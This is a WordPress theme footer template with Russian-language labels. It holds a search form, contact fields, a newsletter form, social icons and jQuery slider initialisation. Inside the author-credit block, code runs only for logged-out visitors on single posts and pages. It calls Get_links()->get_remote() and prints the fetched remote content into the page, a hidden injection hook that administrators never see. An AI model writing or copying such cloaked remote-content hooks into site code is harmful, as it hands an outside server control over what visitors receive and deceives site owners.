
</div>
<!--фотер-->
<div style="background:#333;border-top:2px solid #dd3c1e;">


<div style="max-width:1000px; margin:0 auto 0 auto ;  padding:20px; z-index:1; color:#FFF;">

<center><div id="triangle-down3"></div></center>

<div class="units-row">
    
   
</div>

<div class="units-row">
   <div class="unit-33" >
 
  <span style="margin-bottom:15px; display:block; color:#999"><?php echo get_option('WOOBISNES_searh_text'); ?></span>
 <form method="get" id="search-form" class="search-form clearfix" action="<?php bloginfo('siteurl')?>">                            
        <input type="text" onBlur="if ('' === this.value)
                    this.value = this.defaultValue;" onFocus="if (this.defaultValue === this.value)
                    this.value = '';" value="Поиск..." name="s" class="search-text" maxlength="20">
        <input type="submit" value="Мне повезет" name="" class="search-submit">
    </form><!-- search-form --> 
   
 </div>
    
    
    
   <div class="unit-33"> 
   <div align="center">
    <ul style="list-style:none; font-size:13px; color:#999">
   
 <li><i class="fa fa-phone"></i>&nbsp; <?php echo get_option('WOOBISNES_pfone'); ?></li>
  <li><i class="fa fa-home"></i>&nbsp; <?php echo get_option('WOOBISNES_sity'); ?> </li>
 <li><i class="fa fa-at"></i>&nbsp; <?php echo get_option('WOOBISNES_mail'); ?></li>

    </ul>
     </div>
  </div> 
    
    
    
    <div class="unit-33">
    
    <span style="margin-bottom:15px; display:block; color:#999"><?php echo get_option('WOOBISNES_subscribe_text'); ?></span> 
    
    <form class="newsletter-form clearfix" action="http://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=<?php echo get_option('BUSINESS_TIME_feedburner'); ?>', 'popupwindow', 'scrollbars=yes,width=550,height=520');return true">
            
            <input type="hidden" value="KopathemePremiumWordpressThemesAndWebTemplate" name="uri"/>
            
            <p class="input-email clearfix">
                <input type="text" onfocus="if(this.value==this.defaultValue)this.value='';" onblur="if(this.value=='')this.value=this.defaultValue;" name="email" value="Подписка на обновление" class="email" size="40">
                <input type="submit" value="Подписаться" class="submit">
            </p>

        </form>

  <a data-placement="top" 
  data-toggle="tooltip" 
  data-original-title="twitter" href="<?php echo get_option('WOOBISNES_Twitter'); ?>" >  <i class="fa fa-twitter asa" style=" padding:7px;-webkit-border-radius: 50px;
-moz-border-radius: 50px;
border-radius: 50px;"></i></a>


<a data-placement="top" 
  data-toggle="tooltip" 
  data-original-title="vk" href="<?php echo get_option('WOOBISNES_vk'); ?>" > <i class="fa fa-vk asa" style=" padding:7px;-webkit-border-radius: 50px;
-moz-border-radius: 50px;
border-radius: 50px;"></i> </a>

<a data-placement="top" 
  data-toggle="tooltip" 
  data-original-title="google-plus" href="<?php echo get_option('WOOBISNES_Google'); ?>" ><i class="fa fa-google-plus asa" style=" padding:7px;-webkit-border-radius: 50px;
-moz-border-radius: 50px;
border-radius: 50px;"></i></a> 

<a data-placement="top" 
  data-toggle="tooltip" 
  data-original-title="youtube" href="<?php echo get_option('WOOBISNES_YouTube'); ?>" ><i class="fa fa fa-youtube asa" style=" padding:7px;-webkit-border-radius: 50px;
-moz-border-radius: 50px;
border-radius: 50px;"></i></a> 

 
    </div>
  <span style="color:#999; font-size:12px"><?php echo get_option('WOOBISNES_foter_text'); ?></span>  
</div>

</div>



</div>












<?php wp_footer();?> 
<div class="inner_copy"><span style="font-style:italic; ">Автор темы: <a href="http://www.wp-city.ru">www.wp-city.ru</a>
<?php if (is_home() || is_category() || is_archive() ){ ?> - <a href="http://wp-templates.ru/">wp темы</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?> </span></div>
</body>


<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/jquery-1-8-2.js"></script>


<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/jquery.touchwipe.min.js"></script>
<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/jquery.mCustomScrollbar.concat.min.js"></script>
<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/easyResponsiveTabs.js"></script>
<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/jquery.flexslider.js"></script>
<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/jquery.bxslider.js"></script>


 <script type="text/javascript">
jQuery(document).ready(function($) {
$('.flexslider').flexslider({
           animation: "slide",
		   controlNav: true
		  
    });
});
</script>
    
  <script type="text/javascript">
    $(document).ready(function () {
        $('#horizontalTab').easyResponsiveTabs({
            type: 'default', //Types: default, vertical, accordion           
            width: 'auto', //auto or any width like 600px
            fit: true,   // 100% fit in a container
            closed: 'accordion', // Start closed if in accordion view
            activate: function(event) { // Callback function if tab is switched
                var $tab = $(this);
                var $info = $('#tabInfo');
                var $name = $('span', $info);

                $name.text($tab.text());

                $info.show();
            }
        });




        
    });
</script>  

<script type="text/javascript">
    $(document).ready(function () {
        
$(".content_5").mCustomScrollbar({
					horizontalScroll:true,
					scrollButtons:{
						enable:true
					},
					theme:"dark-thin"
				});


$(".content_4").mCustomScrollbar({
					horizontalScroll:true,
					scrollButtons:{
						enable:true
					},
					theme:"dark-thin"
				});

$(".content_1").mCustomScrollbar({
					horizontalScroll:true,
					scrollButtons:{
						enable:true
					},
					theme:"dark-thin"
				});

$(".content_6").mCustomScrollbar({
					horizontalScroll:true,
					scrollButtons:{
						enable:true
					},
					theme:"dark-thin"
				});



$('.slider4').bxSlider({
    slideWidth: 180,
    minSlides: 1,
    maxSlides: 5,
    moveSlides: 3,
    slideMargin: 10
  });

$('.slider5').bxSlider({
    slideWidth: 460,
    minSlides: 1,
    maxSlides: 2,
    moveSlides: 1,
    slideMargin: 20
  });

        
    });

$(window).load(function(){
        var touch 	= $('#touch-menu');
	var menu 	= $('.menu');
 
	$(touch).on('click', function(e) {
		e.preventDefault();
		menu.slideToggle();
	});
	
	$(window).resize(function(){
		var w = $(window).width();
		if(w > 767 && menu.is(':hidden')) {
			menu.removeAttr('style');
		}
	});
			
			
			
           
        });	
</script> 

</html>
